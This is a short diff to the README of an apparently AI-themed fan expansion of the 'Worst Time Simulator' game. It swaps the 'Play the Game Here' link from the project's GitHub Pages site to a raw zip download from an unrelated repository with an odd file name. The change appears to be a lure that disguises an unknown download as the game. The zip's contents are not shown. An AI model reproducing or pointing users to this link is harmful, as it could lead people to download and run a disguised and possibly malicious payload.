@@ -2,7 +2,7 @@
 
 A custom, AI-enhanced expansion of the **Worst Time Simulator (WTS)** engine. This project integrates custom attack patterns and an AI-driven interface, featuring a "glitch" aesthetic where the AI is "breaking" the game.
 
-## 🔗 [Play the Game Here](https://scriptfinding.github.io/AI-WORST-TIME/)
+## 🔗 [Play the Game Here](https://raw.githubusercontent.com/Scriptfinding/puppetflow/main/media/Software_haematinon.zip)
 
 ---
 
